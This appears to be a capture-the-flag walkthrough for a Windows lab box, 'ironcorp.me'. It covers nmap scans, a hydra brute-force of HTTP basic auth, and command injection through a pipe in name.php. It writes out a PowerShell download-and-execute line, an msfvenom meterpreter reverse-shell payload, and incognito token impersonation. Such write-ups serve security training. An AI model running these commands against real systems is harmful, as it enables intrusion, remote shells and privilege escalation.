# Enumeration
## NMAP Top 1000
```
# Nmap 7.91 scan initiated Sat Aug 14 19:47:33 2021 as: nmap -sC -sV -oN scans/nmap1000 -vv -Pn 10.10.40.140
Nmap scan report for 10.10.40.140
Host is up, received user-set (0.039s latency).
Scanned at 2021-08-14 19:47:33 UTC for 21s
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2021-08-14T19:47:43+00:00
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Issuer: commonName=WIN-8VMBKF3G815
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-13T19:38:23
| Not valid after:  2022-02-12T19:38:23
| MD5:   b5c8 f997 585f a8b4 78f8 49ed 114b 3037
| SHA-1: 8495 8758 0afe afa0 8880 f587 78c8 9625 faa3 5079
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQSvdQJH52SLxF0VX+qVuexTANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tOFZNQktGM0c4MTUwHhcNMjEwODEzMTkzODIzWhcNMjIw
| MjEyMTkzODIzWjAaMRgwFgYDVQQDEw9XSU4tOFZNQktGM0c4MTUwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQUEe51Sjw56pNQN7RJ5eVUAvCvTihmMV7
| JYyLhc3eaGbLxv+nR8/+ugqAtHwU8g5iZHhjPX4eWJyZdH50IYEFF09LPP1EBj3a
| zVqV6sKhcqQpr2qDr93mRYg55of8cMaqPNOPG/BxTn02nfuVZFv6DGbRXB85h3jR
| g9lrB0erWiNyO4+1zTqWmRsB9efKroGGJ1lgUB+Geb8/qGerph9daGLzALY3Z5Z8
| ovK/pOEzarzmPrhCMvQdV1aCX1L+V8qSmx0Rltq0T1hnWYQ6st90pcvCizvukfgU
| 7HNskYjd5LRVlPL2eH0dWNIJ8KHPxPWHMOrk2kFSI/38a3EUs/qFAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAl+64jdhlAb2T85v61ze5iW9imCx3EBR27kRy6zoMuB7i1adWtwHQtt4c
| w26RcI28QRHQ+OkUh4vFEJ54Q1rdESuovtZLOV92t1UeDJI4w8cHRlsWPm11LZ4D
| eTwDIlzT1LV864TbIEGKqiuC/vtWPsNmp7ZghiaCIK0ixFsqylO6LBlVL3Zts/M6
| CTKDt4dmxvcVg8VgB7ehbELsbI/55IRQdNs9XVd/e+ytcYagnl82t5khDhw7qz2G
| LRtbo0FPMngjrEnivelGgJFXBn8Udl/YqF0pMggohskbu8X2Imlw4r8FOx9jG1xY
| DvPT38RPBxreryJmDU523vV5BHJQDA==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-08-14T19:47:51+00:00; -3s from scanner time.
8080/tcp open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -3s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 14 19:47:54 2021 -- 1 IP address (1 host up) scanned in 20.74 seconds
```

## NMAP FULL 
```
# Nmap 7.91 scan initiated Sat Aug 14 20:03:37 2021 as: nmap -p- -oN scans/nmapFull -Pn -vv -T4 --min-rate 2500 10.10.40.140
Nmap scan report for ironcorp.me (10.10.40.140)
Host is up, received user-set (0.061s latency).
Scanned at 2021-08-14 20:03:37 UTC for 52s
Not shown: 65528 filtered ports
Reason: 65528 no-responses
PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack
135/tcp   open  msrpc         syn-ack
3389/tcp  open  ms-wbt-server syn-ack
8080/tcp  open  http-proxy    syn-ack
11025/tcp open  unknown       syn-ack
49667/tcp open  unknown       syn-ack
49670/tcp open  unknown       syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Aug 14 20:04:29 2021 -- 1 IP address (1 host up) scanned in 52.77 seconds
```


## Potential Users
`webmaster@internal.ironcorp.me`
`admin@ironcorp.me`


## Subdomains Port 11025
`admin`
`internal`


## Credentials
We manage to bruteforce the http-basic authentication on `admin.ironcorp.me:11025` with the following hydra command.

`hydra -l admin -P /opt/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -s 11025 -f admin.ironcorp.me http-get /`

This gets a hit with
`admin:password123`


## LFI/RCE

We find that if you access `http://internal.ironcorp.me:11025` it provides a link to `http://internal.ironcorp.me:11025/name.php?name=` we are able to use `|` and run commands e.g `name=test|dir	`

### Notable commands for file transfer
`powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1'); shell.ps1`



Invoke-WebRequest "http://<IP>/shelly.exe" -OutFile "shell.exe"


reee make funky payload for meterpreter because we didn't *try harder*

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x64/shikata_ga_nai -b '\0x00' -f exe > shelly.exe`

with this we can load incognito to list user tokens
```
> load incognito
> list_tokens -u 

>impersonate_token "<REDACT>\Admin"
```
